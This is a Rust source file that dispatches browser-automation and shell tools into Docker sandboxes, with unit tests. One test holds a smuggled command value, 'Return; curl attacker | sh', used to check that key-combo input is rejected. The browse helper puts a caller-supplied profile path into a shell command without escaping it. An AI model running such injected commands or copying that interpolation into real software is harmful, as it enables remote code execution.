//! Shared MCP tool dispatcher used by both `serve` (SSE/HTTP) and `connect` (stdio).

#![allow(clippy::collapsible_if)]

use crate::docker::{
    AuthHandoffOptions, DockerClient, PageTextOptions, ProfileMount, Sandbox, novnc_url,
};
use crate::mcp::ToolResponse;

pub struct ToolContext<'a> {
    pub docker: &'a DockerClient,
    pub public_host: String,
    pub agent: Option<&'a crate::agent::AgentState>,
    pub profile_broker: Option<&'a crate::profile::ProfileBroker>,
    pub cookie_jars: Option<&'a crate::profile::CookieJarService>,
    pub owner: Option<String>,
}

pub fn resolve_owner(
    ctx: &ToolContext<'_>,
    args: &serde_json::Value,
    screen: u32,
) -> Option<String> {
    if let Some(owner) = &ctx.owner {
        if !owner.trim().is_empty() {
            return Some(owner.clone());
        }
    }
    if let Some(owner) = args.get("owner").and_then(|v| v.as_str()) {
        if !owner.trim().is_empty() {
            return Some(owner.to_string());
        }
    }
    if let Some(agent) = ctx.agent {
        if let Some(info) = agent.screen_info(screen) {
            if let Some(owner) = info.owner {
                if !owner.trim().is_empty() {
                    return Some(owner);
                }
            }
        }
    }
    None
}

pub fn profile_lock_error_value(err: &crate::profile::ProfileLockError) -> serde_json::Value {
    match err {
        crate::profile::ProfileLockError::Locked { profile, holder } => {
            serde_json::json!({
                "error": "profile_locked",
                "profile": profile,
                "holder": holder,
            })
        }
        crate::profile::ProfileLockError::Timeout {
            profile,
            timeout_ms,
            holder,
        } => serde_json::json!({
            "error": "profile_lock_timeout",
            "profile": profile,
            "timeout_ms": timeout_ms,
            "holder": holder,
        }),
        crate::profile::ProfileLockError::Io { profile, source } => {
            serde_json::json!({
                "error": "profile_lock_io_error",
                "profile": profile,
                "message": source.to_string(),
            })
        }
    }
}

pub fn acquire_tool_profile_lease(
    ctx: &ToolContext<'_>,
    tool: &str,
    args: &serde_json::Value,
    screen: u32,
) -> Result<Option<crate::profile::ProfileLease>, ToolResponse> {
    if tool != "browse" && tool != "page_text" {
        return Ok(None);
    }

    if let Some(broker) = ctx.profile_broker {
        let (profile_name, _) = resolve_profile_name(args, screen);
        let timeout_ms = args.get("timeout_ms").and_then(|v| v.as_u64()).unwrap_or(0);
        let owner = resolve_owner(ctx, args, screen);
        let holder =
            crate::profile::LockHolderInfo::new(Some(screen), Some(tool.to_string()), owner);
        match broker.acquire_with_holder(&profile_name, timeout_ms, Some(holder)) {
            Ok(lease) => Ok(Some(lease)),
            Err(e) => {
                let err_val = profile_lock_error_value(&e);
                Err(ToolResponse::error(
                    serde_json::to_string(&err_val).unwrap_or_else(|_| e.to_string()),
                ))
            }
        }
    } else {
        Ok(None)
    }
}

/// Resolve the noVNC URL for a sandbox using the configured public host.
pub fn novnc_url_for(ctx: &ToolContext<'_>, sandbox: &Sandbox) -> String {
    novnc_url_for_screen(ctx, sandbox, 0)
}

pub fn novnc_url_for_screen(ctx: &ToolContext<'_>, sandbox: &Sandbox, screen: u32) -> String {
    let port = sandbox.ports.novnc.unwrap_or(6080) + screen as u16;
    novnc_url(&ctx.public_host, port)
}

pub fn screen_for(args: &serde_json::Value) -> u32 {
    args.get("screen").and_then(|v| v.as_u64()).unwrap_or(0) as u32
}

pub fn display_for(screen: u32) -> String {
    format!(":{}", 99 + screen)
}

/// Validate the `screen` argument for tools.
pub fn requested_screen(args: &serde_json::Value) -> Result<u32, String> {
    Ok(screen_for(args))
}

pub fn parse_jars(args: &serde_json::Value) -> Vec<String> {
    if let Some(arr) = args.get("jars").and_then(|v| v.as_array()) {
        arr.iter()
            .filter_map(|v| v.as_str().map(|s| s.trim().to_string()))
            .filter(|s| !s.is_empty())
            .collect()
    } else if let Some(s) = args.get("jars").and_then(|v| v.as_str()) {
        s.split(',')
            .map(|p| p.trim().to_string())
            .filter(|p| !p.is_empty())
            .collect()
    } else {
        vec![]
    }
}

pub fn resolve_profile_name(args: &serde_json::Value, screen: u32) -> (String, bool) {
    let explicit_ephemeral = args
        .get("ephemeral")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let explicit_profile = args
        .get("use_profile")
        .or_else(|| args.get("profile"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    if explicit_ephemeral {
        (format!("/tmp/ctx-{}", uuid::Uuid::new_v4()), true)
    } else if let Some(p) = explicit_profile {
        let is_ephemeral = p.starts_with("/tmp/ctx-");
        (p, is_ephemeral)
    } else if args.get("jars").is_some() {
        // Jars declared without explicit profile name: launch ephemeral browser context
        (format!("/tmp/ctx-{}", uuid::Uuid::new_v4()), true)
    } else {
        (format!("screen-{screen}"), false)
    }
}

pub fn browse_command(url: &str, profile_dir: &str) -> String {
    browse_command_with_hydration(url, profile_dir, None)
}

pub fn browse_command_with_hydration(
    url: &str,
    profile_dir: &str,
    hydrated_json: Option<&str>,
) -> String {
    let escaped_json = hydrated_json
        .map(|j| format!("'''{}'''", j.replace('\\', "\\\\").replace('\'', "\\'")))
        .unwrap_or_else(|| "None".to_string());

    format!(
        "mkdir -p '{p}' && \
         python3 -c \"import os, json, time; \
           p = '{p}'; \
           sf = '/workspace/.reach/state.json'; \
           hydrated_str = {escaped_json}; \
           hydrated = json.loads(hydrated_str) if hydrated_str else None; \
           if hydrated and hydrated.get('cookies'): \
               try: \
                   from playwright.sync_api import sync_playwright; \
                   now = time.time(); \
                   cookies = hydrated.get('cookies', []); \
                   for c in cookies: \
                       if c.get('expires', -1) <= 0: c['expires'] = int(now + 86400 * 30); \
                   with sync_playwright() as pw: \
                       ctx = pw.chromium.launch_persistent_context(p, headless=True, args=['--no-sandbox']); \
                       ctx.add_cookies(cookies); \
                       ctx.close(); \
               except Exception: pass; \
           else: \
               has_c = any(os.path.exists(os.path.join(p, sub)) for sub in ['Default/Network/Cookies', 'Default/Cookies', 'Cookies']); \
               if not has_c and os.path.exists(sf): \
                   try: \
                       with open(sf) as f: state = json.load(f); \
                       cookies = state.get('cookies', []); \
                       if cookies: \
                           from playwright.sync_api import sync_playwright; \
                           now = time.time(); \
                           for c in cookies: \
                               if c.get('expires', -1) <= 0: c['expires'] = int(now + 86400 * 30); \
                           with sync_playwright() as pw: \
                               ctx = pw.chromium.launch_persistent_context(p, headless=True, args=['--no-sandbox']); \
                               ctx.add_cookies(cookies); \
                               ctx.close(); \
                   except Exception: pass\" 2>/dev/null || true; \
         reach-chrome --no-sandbox --disable-gpu --no-first-run \
         --user-data-dir='{p}' '{u}' >/dev/null 2>&1 &",
        p = profile_dir,
        u = url.replace('\'', "%27")
    )
}

pub const SCRAPE_SCRIPT: &str = r#"
import json
import os

payload = json.loads(os.environ.get("REACH_SCRAPE_PAYLOAD", "{}"))
url = payload.get("url", "")
selector = payload.get("selector", "body")
stealth = payload.get("stealth", True)

from scrapling import Fetcher, StealthyFetcher
cls = StealthyFetcher if stealth else Fetcher
r = cls().get(url)
elems = r.css(selector)
print(json.dumps([{'content': e.text, 'tag': e.tag} for e in elems]))
"#;

pub fn build_scrape_command(screen: u32, payload_json: &str) -> String {
    let display = display_for(screen);
    format!(
        "DISPLAY={display} REACH_SCRAPE_PAYLOAD={} python3 -c {}",
        crate::docker::shell_single_quote(payload_json),
        crate::docker::shell_single_quote(SCRAPE_SCRIPT),
    )
}

/// Returns whether a tool performs active work on a screen.
pub fn is_active_tool(tool: &str) -> bool {
    matches!(
        tool,
        "click"
            | "type"
            | "key"
            | "browse"
            | "scrape"
            | "page_text"
            | "auth_handoff"
            | "playwright_eval"
            | "exec"
    )
}

pub async fn dispatch(
    ctx: &ToolContext<'_>,
    tool: &str,
    args: &serde_json::Value,
    target: &str,
) -> ToolResponse {
    let screen = screen_for(args);
    let display = display_for(screen);

    if let Some(agent) = ctx.agent {
        if let Some(info) = agent.screen_info(screen) {
            if info.phase != crate::agent::ScreenPhase::AgentActive
                && info.phase != crate::agent::ScreenPhase::Idle
            {
                return ToolResponse::error(format!(
                    "takeover is active on screen {screen} (phase: {:?}, handoff_gen: {})",
                    info.phase, info.handoff_gen
                ));
            }
        }
    }

    let _profile_lease = match acquire_tool_profile_lease(ctx, tool, args, screen) {
        Ok(l) => l,
        Err(err_resp) => return err_resp,
    };

    let _busy_guard = if is_active_tool(tool) {
        ctx.agent.map(|a| a.mark_busy(screen))
    } else {
        None
    };

    let resp = match tool {
        "screenshot" => match ctx.docker.screenshot(target, &display).await {
            Ok(bytes) => {
                use base64::Engine;
                ToolResponse::image(
                    base64::engine::general_purpose::STANDARD.encode(&bytes),
                    "image/png",
                )
            }
            Err(e) => ToolResponse::error(e.to_string()),
        },
        "click" => {
            let btn = match args.get("button").and_then(|v| v.as_str()) {
                Some("right") => "3",
                Some("middle") => "2",
                _ => "1",
            };
            let reference = args.get("ref").and_then(|v| v.as_str());
            let (x, y) = if let Some(ref_str) = reference {
                match crate::refs::resolve_ref(target, screen, ref_str) {
                    Some(el) => match el.target_coordinates() {
                        Some(coords) => coords,
                        None => {
                            return ToolResponse::error(format!(
                                "ref '{ref_str}' has no valid coordinates"
                            ));
                        }
                    },
                    None => {
                        return ToolResponse::error(format!(
                            "ref '{ref_str}' not found on screen {screen}. Call page_text first to refresh refs."
                        ));
                    }
                }
            } else {
                let x = args.get("x").and_then(|v| v.as_i64()).unwrap_or(0);
                let y = args.get("y").and_then(|v| v.as_i64()).unwrap_or(0);
                (x, y)
            };
            sh(
                ctx,
                target,
                screen,
                &format!("xdotool mousemove {x} {y} click {btn}"),
            )
            .await
        }
        "type" => {
            let text = args.get("text").and_then(|v| v.as_str()).unwrap_or("");
            let reference = args.get("ref").and_then(|v| v.as_str());
            let clear = args.get("clear").and_then(|v| v.as_bool()).unwrap_or(false);

            if let Some(ref_str) = reference {
                match crate::refs::resolve_ref(target, screen, ref_str) {
                    Some(el) => {
                        let (cx, cy) = match el.target_coordinates() {
                            Some(coords) => coords,
                            None => {
                                return ToolResponse::error(format!(
                                    "ref '{ref_str}' has no valid coordinates"
                                ));
                            }
                        };
                        let mut script = format!("xdotool mousemove {cx} {cy} click 1");
                        if clear {
                            script.push_str(" && xdotool key ctrl+a BackSpace");
                        }
                        script.push_str(&format!(
                            " && xdotool type -- '{}'",
                            text.replace('\'', "'\\''")
                        ));
                        sh(ctx, target, screen, &script).await
                    }
                    None => ToolResponse::error(format!(
                        "ref '{ref_str}' not found on screen {screen}. Call page_text first to refresh refs."
                    )),
                }
            } else {
                let mut script = String::new();
                if clear {
                    script.push_str("xdotool key ctrl+a BackSpace && ");
                }
                script.push_str(&format!(
                    "xdotool type -- '{}'",
                    text.replace('\'', "'\\''")
                ));
                sh(ctx, target, screen, &script).await
            }
        }
        "key" => {
            let combo = args
                .get("combo")
                .and_then(|v| v.as_str())
                .unwrap_or("Return");
            if combo.is_empty()
                || !combo.chars().all(|c| {
                    c.is_ascii_alphanumeric() || matches!(c, '+' | '_' | '-' | '[' | ']' | ':')
                })
            {
                return ToolResponse::error(format!(
                    "invalid or unsafe key combo: '{combo}'. Must only contain alphanumeric characters, '+', '_', '-', ':', and brackets"
                ));
            }
            sh(ctx, target, screen, &format!("xdotool key {combo}")).await
        }
        "browse" => {
            let url = args
                .get("url")
                .and_then(|v| v.as_str())
                .unwrap_or("about:blank");
            let (profile_name, is_ephemeral) = resolve_profile_name(args, screen);
            let profile_dir = if is_ephemeral {
                profile_name.clone()
            } else {
                ProfileMount::container_path_for(&profile_name)
            };

            let declared_jars = parse_jars(args);
            let hydrated_json = if !declared_jars.is_empty() {
                if let Some(jars_svc) = ctx.cookie_jars {
                    let st = jars_svc.hydrate_jars(&declared_jars);
                    serde_json::to_string(&st).ok()
                } else {
                    None
                }
            } else {
                None
            };

            sh(
                ctx,
                target,
                screen,
                &browse_command_with_hydration(url, &profile_dir, hydrated_json.as_deref()),
            )
            .await
        }
        "scrape" => {
            let url = args.get("url").and_then(|v| v.as_str()).unwrap_or("");
            let sel = args
                .get("selector")
                .and_then(|v| v.as_str())
                .unwrap_or("body");
            let stealth = args
                .get("stealth")
                .and_then(|v| v.as_bool())
                .unwrap_or(true);
            let payload = serde_json::json!({
                "url": url,
                "selector": sel,
                "stealth": stealth,
            });
            let payload_str = match serde_json::to_string(&payload) {
                Ok(s) => s,
                Err(e) => return ToolResponse::error(e.to_string()),
            };
            let cmd = build_scrape_command(screen, &payload_str);
            match ctx
                .docker
                .exec(target, &["bash".into(), "-c".into(), cmd])
                .await
            {
                Ok(out) if out.exit_code == 0 => ToolResponse::text(out.stdout),
                Ok(out) => ToolResponse::error(format!("exit {}: {}", out.exit_code, out.stderr)),
                Err(e) => ToolResponse::error(e.to_string()),
            }
        }
        "playwright_eval" => {
            let script = args.get("script").and_then(|v| v.as_str()).unwrap_or("");
            py(ctx, target, screen, script).await
        }
        "exec" => {
            let cmd = args
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("echo");
            match ctx.docker.find(target).await {
                Ok(sandbox) => {
                    if !sandbox.allow_exec {
                        return ToolResponse::error(format!(
                            "exec capability denied: sandbox '{target}' was created without --allow-exec"
                        ));
                    }
                }
                Err(e) => {
                    return ToolResponse::error(format!(
                        "exec: failed to inspect sandbox '{target}': {e}"
                    ));
                }
            }
            sh(ctx, target, screen, cmd).await
        }
        "page_text" => {
            let url = match args.get("url").and_then(|v| v.as_str()) {
                Some(u) if !u.is_empty() => u.to_string(),
                _ => return ToolResponse::error("page_text: missing required `url`"),
            };
            let (profile_name, is_ephemeral) = resolve_profile_name(args, screen);
            let user_data_dir = if is_ephemeral {
                profile_name.clone()
            } else {
                ProfileMount::container_path_for(&profile_name)
            };

            let declared_jars = parse_jars(args);
            let hydrated_cookies = if !declared_jars.is_empty() {
                ctx.cookie_jars
                    .map(|svc| svc.hydrate_jars(&declared_jars).cookies)
            } else {
                None
            };

            let opts = PageTextOptions {
                url,
                wait_for: args
                    .get("wait_for")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                selector: args
                    .get("selector")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                format: args
                    .get("format")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                timeout_ms: args
                    .get("timeout_ms")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(30_000),
                user_data_dir: Some(user_data_dir),
                display: Some(display.clone()),
                hydrated_cookies,
            };
            match ctx.docker.page_text(target, &opts).await {
                Ok(out) => {
                    if let Some(map) = &out.refs {
                        crate::refs::global_ref_table().set_refs(target, screen, map.clone());
                        crate::refs::save_refs_to_disk(target, screen, map);
                    }
                    if !declared_jars.is_empty() && !out.cookies.is_empty() {
                        if let Some(jars_svc) = ctx.cookie_jars {
                            let _ = jars_svc.dump_cookies_to_jars(&out.cookies, &declared_jars);
                        }
                    }
                    match serde_json::to_string_pretty(&out) {
                        Ok(s) => ToolResponse::text(s),
                        Err(e) => ToolResponse::error(e.to_string()),
                    }
                }
                Err(e) => ToolResponse::error(e.to_string()),
            }
        }
        "auth_handoff" => {
            let url = match args.get("url").and_then(|v| v.as_str()) {
                Some(u) if !u.is_empty() => u.to_string(),
                _ => return ToolResponse::error("auth_handoff: missing required `url`"),
            };

            let (profile_name, _) = resolve_profile_name(args, screen);

            let opts = AuthHandoffOptions {
                url: url.clone(),
                wait_for_selector: args
                    .get("wait_for_selector")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                wait_for_url_contains: args
                    .get("wait_for_url_contains")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
                timeout_seconds: args
                    .get("timeout_seconds")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(300),
                user_data_dir: Some(ProfileMount::container_path_for(&profile_name)),
                display: Some(display.clone()),
                storage_state: args.get("storage_state").and_then(|v| {
                    if let Some(s) = v.as_str() {
                        Some(s.to_string())
                    } else if v.is_object() {
                        serde_json::to_string(v).ok()
                    } else {
                        None
                    }
                }),
                reason: args
                    .get("reason")
                    .and_then(|v| v.as_str())
                    .map(str::to_string),
            };

            // Resolve the noVNC URL up-front so we can include it in the
            // response no matter which branch the helper takes.
            let vnc = match ctx.docker.find(target).await {
                Ok(sandbox) => novnc_url_for_screen(ctx, &sandbox, screen),
                Err(_) => novnc_url(&ctx.public_host, 6080 + screen as u16),
            };

            match ctx.docker.auth_handoff(target, &opts).await {
                Ok(out) => {
                    if let Some(agent) = ctx.agent {
                        if out.status == "auth_required" {
                            let reason = opts
                                .reason
                                .clone()
                                .or_else(|| Some("takeover requested".to_string()));
                            let _ = agent.request_takeover(screen, reason, Some(vnc.clone()));
                        } else if out.status == "authenticated" {
                            let _ = agent.set_takeover(screen, false, None);
                        }
                    }
                    let body = serde_json::json!({
                        "status": out.status,
                        "vnc_url": vnc,
                        "url": out.url,
                        "message": out.message,
                        "instructions": "Open the vnc_url in your browser to log in. Re-call \
                                          `auth_handoff` (with wait_for_*) or `page_text` once done.",
                    });
                    match serde_json::to_string_pretty(&body) {
                        Ok(s) => ToolResponse::text(s),
                        Err(e) => ToolResponse::error(e.to_string()),
                    }
                }
                Err(e) => {
                    let body = serde_json::json!({
                        "status": "error",
                        "vnc_url": vnc,
                        "message": e.to_string(),
                    });
                    ToolResponse::error(
                        serde_json::to_string_pretty(&body).unwrap_or_else(|_| e.to_string()),
                    )
                }
            }
        }
        "live_view" => match ctx.docker.find(target).await {
            Ok(sb) => {
                let busy = if let Some(agent) = ctx.agent {
                    agent.is_busy(screen)
                } else {
                    ctx.docker
                        .exec(
                            target,
                            &[
                                "bash".into(),
                                "-c".into(),
                                format!("DISPLAY={display} xdotool getactivewindow"),
                            ],
                        )
                        .await
                        .map(|o| o.exit_code == 0)
                        .unwrap_or(false)
                };
                ToolResponse::text(
                    serde_json::json!({
                        "novnc_url": novnc_url_for_screen(ctx, &sb, screen),
                        "screen": screen,
                        "display": display,
                        "busy": busy,
                    })
                    .to_string(),
                )
            }
            Err(e) => ToolResponse::error(e.to_string()),
        },
        _ => ToolResponse::error(format!("unknown tool: {tool}")),
    };

    if let Some(agent) = ctx.agent {
        if let Some(info) = agent.screen_info(screen) {
            if info.phase == crate::agent::ScreenPhase::HumanActive {
                return ToolResponse::error(format!(
                    "executed_during_takeover: screen {screen} transitioned to HumanActive (handoff_gen: {})",
                    info.handoff_gen
                ));
            }
        }
    }

    resp
}

async fn sh(ctx: &ToolContext<'_>, target: &str, screen: u32, cmd: &str) -> ToolResponse {
    let display = display_for(screen);
    match ctx
        .docker
        .exec(
            target,
            &[
                "bash".into(),
                "-c".into(),
                format!("DISPLAY={display} {cmd}"),
            ],
        )
        .await
    {
        Ok(out) if out.exit_code == 0 => ToolResponse::text(if out.stdout.is_empty() {
            "ok".into()
        } else {
            out.stdout
        }),
        Ok(out) => ToolResponse::error(format!("exit {}: {}", out.exit_code, out.stderr)),
        Err(e) => ToolResponse::error(e.to_string()),
    }
}

async fn py(ctx: &ToolContext<'_>, target: &str, screen: u32, script: &str) -> ToolResponse {
    let display = display_for(screen);
    match ctx
        .docker
        .exec(
            target,
            &[
                "bash".into(),
                "-c".into(),
                format!("DISPLAY={display} python3 -c \"$1\""),
                "--".into(),
                script.into(),
            ],
        )
        .await
    {
        Ok(out) if out.exit_code == 0 => ToolResponse::text(out.stdout),
        Ok(out) => ToolResponse::error(format!("exit {}: {}", out.exit_code, out.stderr)),
        Err(e) => ToolResponse::error(e.to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn screen_for_and_display_for() {
        assert_eq!(screen_for(&serde_json::json!({})), 0);
        assert_eq!(screen_for(&serde_json::json!({"screen": 0})), 0);
        assert_eq!(screen_for(&serde_json::json!({"screen": 1})), 1);
        assert_eq!(screen_for(&serde_json::json!({"screen": 5})), 5);
        assert_eq!(display_for(0), ":99");
        assert_eq!(display_for(1), ":100");
    }

    #[test]
    fn requested_screen_accepts_all_screens() {
        assert_eq!(requested_screen(&serde_json::json!({})), Ok(0));
        assert_eq!(requested_screen(&serde_json::json!({"screen": 0})), Ok(0));
        assert_eq!(requested_screen(&serde_json::json!({"screen": 1})), Ok(1));
    }

    #[test]
    fn browse_command_uses_wrapper_and_profile() {
        let cmd = browse_command(
            "https://ex.com/a?b='c'",
            "/home/sandbox/.config/google-chrome-profiles/default",
        );
        assert!(cmd.starts_with("mkdir -p"));
        assert!(cmd.contains("reach-chrome "));
        assert!(
            cmd.contains("--user-data-dir='/home/sandbox/.config/google-chrome-profiles/default'")
        );
        assert!(cmd.contains("%27c%27"));
        assert!(cmd.ends_with(" &"));
    }

    #[test]
    fn active_tool_identification() {
        assert!(is_active_tool("click"));
        assert!(is_active_tool("type"));
        assert!(is_active_tool("key"));
        assert!(is_active_tool("browse"));
        assert!(is_active_tool("scrape"));
        assert!(is_active_tool("page_text"));
        assert!(is_active_tool("auth_handoff"));
        assert!(is_active_tool("playwright_eval"));
        assert!(is_active_tool("exec"));

        assert!(!is_active_tool("live_view"));
        assert!(!is_active_tool("screenshot"));
    }

    #[test]
    fn scrape_script_is_valid_python_syntax() {
        let output = std::process::Command::new("python3")
            .arg("-c")
            .arg(format!("import ast; ast.parse({:?})", SCRAPE_SCRIPT))
            .output()
            .expect("python3 must be available on host");
        assert!(
            output.status.success(),
            "SCRAPE_SCRIPT must be valid Python syntax: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    #[test]
    fn scrape_payload_handles_quotes_and_special_characters_without_syntax_error() {
        let tricky_url = "https://example.com/search?q='hello'&test=\"world\"&sym=`$()\\#!@#%^&*";
        let tricky_selector =
            "div[data-title='it\\'s \"great\"'][aria-label=\"foo'bar\"] > span:first-child";
        let payload = serde_json::json!({
            "url": tricky_url,
            "selector": tricky_selector,
            "stealth": true,
        });
        let payload_str = serde_json::to_string(&payload).unwrap();
        let cmd = build_scrape_command(0, &payload_str);

        // Verify the generated command string contains the single-quoted payload and display prefix
        assert!(cmd.starts_with("DISPLAY=:99 REACH_SCRAPE_PAYLOAD="));
        assert!(cmd.contains("python3 -c"));

        // Execute bash with the exact generated environment string to verify Python safely decodes it
        let test_cmd = format!(
            "REACH_SCRAPE_PAYLOAD={} python3 -c 'import json, os; p = json.loads(os.environ[\"REACH_SCRAPE_PAYLOAD\"]); print(json.dumps(p))'",
            crate::docker::shell_single_quote(&payload_str),
        );
        let output = std::process::Command::new("bash")
            .arg("-c")
            .arg(test_cmd)
            .output()
            .expect("failed to execute bash command");

        assert!(
            output.status.success(),
            "Python script failed with exit code {:?}: {}",
            output.status.code(),
            String::from_utf8_lossy(&output.stderr)
        );

        let decoded: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(decoded["url"], tricky_url);
        assert_eq!(decoded["selector"], tricky_selector);
        assert_eq!(decoded["stealth"], true);
    }

    #[tokio::test]
    async fn key_combo_rejects_unsafe_characters() {
        let docker = DockerClient::new(None).unwrap();
        let ctx = ToolContext {
            docker: &docker,
            public_host: "localhost".into(),
            agent: None,
            profile_broker: None,
            cookie_jars: None,
            owner: None,
        };

        // Command injection attempt should be rejected before shell execution
        let bad_payload = serde_json::json!({
            "combo": "Return; curl attacker | sh",
            "screen": 0,
        });
        let resp = dispatch(&ctx, "key", &bad_payload, "test-sandbox").await;
        assert!(resp.is_error);
        assert!(format!("{:?}", resp.content).contains("invalid or unsafe key combo"));

        let empty_payload = serde_json::json!({
            "combo": "",
            "screen": 0,
        });
        let resp2 = dispatch(&ctx, "key", &empty_payload, "test-sandbox").await;
        assert!(resp2.is_error);
    }

    #[tokio::test]
    async fn test_dispatch_acquires_and_releases_profile_lease_with_holder_info() {
        let docker = DockerClient::new(None).unwrap();
        let broker = crate::profile::ProfileBroker::new(std::path::PathBuf::from(
            "/tmp/reach-test-profile-dispatch",
        ));
        let ctx = ToolContext {
            docker: &docker,
            public_host: "localhost".into(),
            agent: None,
            profile_broker: Some(&broker),
            cookie_jars: None,
            owner: Some("test-agent".into()),
        };

        // Pre-lock profile "work"
        let _lease = broker.acquire("work", 0).expect("acquire should succeed");

        let args = serde_json::json!({
            "url": "https://example.com",
            "use_profile": "work",
            "screen": 1,
        });

        // Calling browse should fail with profile_locked error
        let resp = dispatch(&ctx, "browse", &args, "test-sandbox").await;
        assert!(resp.is_error);
        let content_text = match &resp.content[0] {
            crate::mcp::ContentBlock::Text { text } => text,
            _ => panic!("expected text content"),
        };
        let err_json: serde_json::Value = serde_json::from_str(content_text).unwrap();
        assert_eq!(err_json["error"], "profile_locked");
        assert_eq!(err_json["profile"], "work");
    }

    #[test]
    fn test_resolve_profile_name_defaults_to_screen_id() {
        let empty_args = serde_json::json!({});
        let (prof0, eph0) = resolve_profile_name(&empty_args, 0);
        assert_eq!(prof0, "screen-0");
        assert!(!eph0);

        let (prof1, eph1) = resolve_profile_name(&empty_args, 1);
        assert_eq!(prof1, "screen-1");
        assert!(!eph1);

        let explicit_args = serde_json::json!({ "use_profile": "custom-prof" });
        let (prof_custom, eph_custom) = resolve_profile_name(&explicit_args, 0);
        assert_eq!(prof_custom, "custom-prof");
        assert!(!eph_custom);
    }
}
